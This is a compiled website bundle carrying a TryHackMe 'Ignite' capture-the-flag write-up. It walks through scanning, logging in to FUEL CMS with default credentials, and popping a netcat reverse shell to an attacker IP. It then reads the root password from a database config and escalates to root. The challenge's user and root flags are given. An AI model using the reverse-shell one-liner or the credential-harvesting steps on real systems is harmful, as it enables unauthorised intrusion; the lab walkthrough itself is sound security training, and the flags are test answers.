"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2731],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),p=c(n),h=r,m=p["".concat(l,".").concat(h)]||p[h]||d[h]||o;return n?a.createElement(m,i(i({ref:t},u),{},{components:n})):a.createElement(m,i({ref:t},u))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=h;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[p]="string"==typeof e?e:r,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},4417:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var a=n(87462),r=(n(67294),n(3905));const o={},i="Ignite",s={unversionedId:"Tryhackme/Ignite/ignite",id:"Tryhackme/Ignite/ignite",title:"Ignite",description:"A new start-up has a few issues with their web server.",source:"@site/writeups/Tryhackme/Ignite/ignite.md",sourceDirName:"Tryhackme/Ignite",slug:"/Tryhackme/Ignite/",permalink:"/writeups/Tryhackme/Ignite/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"ICE",permalink:"/writeups/Tryhackme/Ice/"},next:{title:"Inclusion",permalink:"/writeups/Tryhackme/Inclusion/"}},l={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Root it!",id:"task-1-root-it",level:2}],u={toc:c},p="wrapper";function d(e){let{components:t,...o}=e;return(0,r.kt)(p,(0,a.Z)({},u,o,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"ignite"},"Ignite"),(0,r.kt)("p",null,"A new start-up has a few issues with their web server."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/ignite"},"Ignite")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,r.kt)("li",{parentName:"ul"},"Exploitation Upload"),(0,r.kt)("li",{parentName:"ul"},"Stored Passwords & Keys")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-root-it"},"Task 1 Root it!"),(0,r.kt)("p",null,"Root the box! Designed and created by ",(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/DarkStar7471"},"DarkStar7471"),", built by ",(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/p/Paradox"},"Paradox"),"."),(0,r.kt)("hr",null),(0,r.kt)("p",null,"Enjoy the room! For future rooms and write-ups, follow ",(0,r.kt)("a",{parentName:"p",href:"https://twitter.com/darkstar7471"},"@darkstar7471")," on Twitter."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ignite$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.61.59\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 09:40 CEST\nNmap scan report for 10.10.61.59\nHost is up (0.040s latency).\nNot shown: 999 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry\n|_/fuel/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Welcome to FUEL CMS\nAggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%), Linux 3.8 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT      ADDRESS\n1   36.60 ms 10.8.0.1\n2   36.85 ms 10.10.61.59\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 23.39 seconds\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/47138"},"fuelCMS 1.4.1 - Remote Code Execution")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://docs.getfuelcms.com/general/security"},"FUEL Configuration Security Settings")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.61.59/fuel/login"},"http://10.10.61.59/fuel/login")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"admin:admin")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(47234).Z,width:"327",height:"299"})),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://10.10.61.59/fuel/pages/upload"},"http://10.10.61.59/fuel/pages/upload")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ignite$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.61.59] 35044\n/bin/sh: 0: can't access tty; job control turned off\n$ whoami\nwww-data\n$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\nwww-data@ubuntu:/var/www/html$ cd /home\ncd /home\nwww-data@ubuntu:/home$ ls\nls\nwww-data\nwww-data@ubuntu:/home$ cd www-data\ncd www-data\nwww-data@ubuntu:/home/www-data$ ls\nls\nflag.txt\nwww-data@ubuntu:/home/www-data$ cat flag.txt\ncat flag.txt\n6470e394cbf6dab6a91682cc8585059b\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@ubuntu:/home/www-data$ cat /var/www/html/fuel/application/config/database.php\n<ata$ cat /var/www/html/fuel/application/config/database.php\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-php"},"<?php\ndefined('BASEPATH') OR exit('No direct script access allowed');\n\n/*\n| -------------------------------------------------------------------\n| DATABASE CONNECTIVITY SETTINGS\n| -------------------------------------------------------------------\n| This file will contain the settings needed to access your database.\n|\n| For complete instructions please consult the 'Database Connection'\n| page of the User Guide.\n|\n| -------------------------------------------------------------------\n| EXPLANATION OF VARIABLES\n| -------------------------------------------------------------------\n|\n|       ['dsn']      The full DSN string describe a connection to the database.\n|       ['hostname'] The hostname of your database server.\n|       ['username'] The username used to connect to the database\n|       ['password'] The password used to connect to the database\n|       ['database'] The name of the database you want to connect to\n|       ['dbdriver'] The database driver. e.g.: mysqli.\n|                       Currently supported:\n|                                cubrid, ibase, mssql, mysql, mysqli, oci8,\n|                                odbc, pdo, postgre, sqlite, sqlite3, sqlsrv\n|       ['dbprefix'] You can add an optional prefix, which will be added\n|                                to the table name when using the  Query Builder class\n|       ['pconnect'] TRUE/FALSE - Whether to use a persistent connection\n|       ['db_debug'] TRUE/FALSE - Whether database errors should be displayed.\n|       ['cache_on'] TRUE/FALSE - Enables/disables query caching\n|       ['cachedir'] The path to the folder where cache files should be stored\n|       ['char_set'] The character set used in communicating with the database\n|       ['dbcollat'] The character collation used in communicating with the database\n|                                NOTE: For MySQL and MySQLi databases, this setting is only used\n|                                as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7\n|                                (and in table creation queries made with DB Forge).\n|                                There is an incompatibility in PHP with mysql_real_escape_string() which\n|                                can make your site vulnerable to SQL injection if you are using a\n|                                multi-byte character set and are running versions lower than these.\n|                                Sites using Latin-1 or UTF-8 database character set and collation are unaffected.\n|       ['swap_pre'] A default table prefix that should be swapped with the dbprefix\n|       ['encrypt']  Whether or not to use an encrypted connection.\n|\n|                       'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE\n|                       'mysqli' and 'pdo/mysql' drivers accept an array with the following options:\n|\n|                               'ssl_key'    - Path to the private key file\n|                               'ssl_cert'   - Path to the public key certificate file\n|                               'ssl_ca'     - Path to the certificate authority file\n|                               'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format\n|                               'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')\n|                               'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)\n|\n|       ['compress'] Whether or not to use client compression (MySQL only)\n|       ['stricton'] TRUE/FALSE - forces 'Strict Mode' connections\n|                                                       - good for ensuring strict SQL while developing\n|       ['ssl_options'] Used to set various SSL options that can be used when making SSL connections.\n|       ['failover'] array - A array with 0 or more data for connections if the main should fail.\n|       ['save_queries'] TRUE/FALSE - Whether to \"save\" all executed queries.\n|                               NOTE: Disabling this will also effectively disable both\n|                               $this->db->last_query() and profiling of DB queries.\n|                               When you run a query, with this setting set to TRUE (default),\n|                               CodeIgniter will store the SQL statement for debugging purposes.\n|                               However, this may cause high memory usage, especially if you run\n|                               a lot of SQL queries ... disable this to avoid that problem.\n|\n| The $active_group variable lets you choose which connection group to\n| make active.  By default there is only one group (the 'default' group).\n|\n| The $query_builder variables lets you determine whether or not to load\n| the query builder class.\n*/\n$active_group = 'default';\n$query_builder = TRUE;\n\n$db['default'] = array(\n        'dsn'   => '',\n        'hostname' => 'localhost',\n        'username' => 'root',\n        'password' => 'mememe',\n        'database' => 'fuel_schema',\n        'dbdriver' => 'mysqli',\n        'dbprefix' => '',\n        'pconnect' => FALSE,\n        'db_debug' => (ENVIRONMENT !== 'production'),\n        'cache_on' => FALSE,\n        'cachedir' => '',\n        'char_set' => 'utf8',\n        'dbcollat' => 'utf8_general_ci',\n        'swap_pre' => '',\n        'encrypt' => FALSE,\n        'compress' => FALSE,\n        'stricton' => FALSE,\n        'failover' => array(),\n        'save_queries' => TRUE\n);\n\n// used for testing purposes\nif (defined('TESTING'))\n{\n        @include(TESTER_PATH.'config/tester_database'.EXT);\n}\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@ubuntu:/home/www-data$ su - root\nsu - root\nPassword: mememe\n\nroot@ubuntu:~# cd /root\ncd /root\nroot@ubuntu:~# ls\nls\nroot.txt\nroot@ubuntu:~# cat root.txt\ncat root.txt\nb9bbcb33e11b80be759c4e844862482d\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"User.txt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"6470e394cbf6dab6a91682cc8585059b")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Root.txt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"b9bbcb33e11b80be759c4e844862482d")))}d.isMDXComponent=!0},47234:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-10-14_09-43-aab6f9482ac53a64658cf8b37f59dc97.png"}}]);